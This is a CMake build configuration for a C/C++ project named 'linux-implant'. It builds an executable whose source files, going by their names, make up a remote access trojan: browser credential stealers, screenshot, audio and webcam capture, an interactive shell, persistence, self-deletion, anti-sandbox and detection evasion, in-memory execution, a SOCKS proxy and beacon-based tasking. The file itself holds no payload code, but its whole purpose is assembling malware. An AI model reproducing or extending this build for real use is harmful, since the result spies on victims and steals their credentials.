cmake_minimum_required(VERSION 3.20)
project(linux-implant LANGUAGES C CXX)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)

# Add definitions
add_definitions(-DSQLITE_OMIT_FTS5)
add_definitions(-DLINUX)

# Find dependencies
find_package(OpenSSL REQUIRED)
find_package(PkgConfig REQUIRED)

pkg_check_modules(X11 REQUIRED x11)

# nlohmann-json
include(FetchContent)
FetchContent_Declare(
    json
    URL https://github.com/nlohmann/json/releases/download/v3.11.2/json.tar.xz
    DOWNLOAD_EXTRACT_TIMESTAMP TRUE
)
FetchContent_MakeAvailable(json)

# googletest
FetchContent_Declare(
  googletest
  URL https://github.com/google/googletest/archive/refs/heads/main.zip
  DOWNLOAD_EXTRACT_TIMESTAMP TRUE
)
FetchContent_MakeAvailable(googletest)

# Executable
add_executable(implant
    src/main.cpp
    src/utils/Logger.cpp
    src/utils/Shared.cpp
    src/utils/SelfDelete.cpp
    src/core/ImplantId.cpp
    src/crypto/AesGcm.cpp
    src/crypto/Base64.cpp
    src/http/HttpClient.cpp
    src/http/RedirectorResolver.cpp
    src/beacon/Beacon.cpp
    src/beacon/TaskDispatcher.cpp
    src/recon/SysInfo.cpp
    src/recon/InstalledSoftware.cpp
    src/persistence/Persistence.cpp
    src/utils/Exec.cpp
    src/credential/ChromiumStealer.cpp
    src/credential/FirefoxStealer.cpp
    src/capture/Screenshot.cpp
    src/capture/Audio.cpp
    src/capture/Webcam.cpp
    src/streaming/Streamer.cpp
    src/shell/InteractiveShell.cpp
    src/fs/FileSystem.cpp
    src/recon/DeepRecon.cpp
    src/evasion/AntiSandbox.cpp
    src/evasion/Detection.cpp
    src/evasion/JunkLogic.cpp
    src/execution/InMemory.cpp
    src/network/SocksProxy.cpp
    src/wifi/WifiScanner.cpp
    external/sqlite3/sqlite3.c
)

target_include_directories(implant PUBLIC
    src
    external
    external/sqlite3
    ${OPENSSL_INCLUDE_DIR}
    ${X11_INCLUDE_DIRS}
)

target_link_libraries(implant
    nlohmann_json::nlohmann_json
    OpenSSL::SSL
    OpenSSL::Crypto
    ${X11_LIBRARIES}
    pthread
    dl
    util
)

# Tests
add_executable(unit_tests
    tests/Base64Test.cpp
    tests/AesGcmTest.cpp
    src/crypto/Base64.cpp
    src/crypto/AesGcm.cpp
)
target_include_directories(unit_tests PRIVATE src)
target_link_libraries(unit_tests GTest::gtest_main OpenSSL::Crypto pthread)
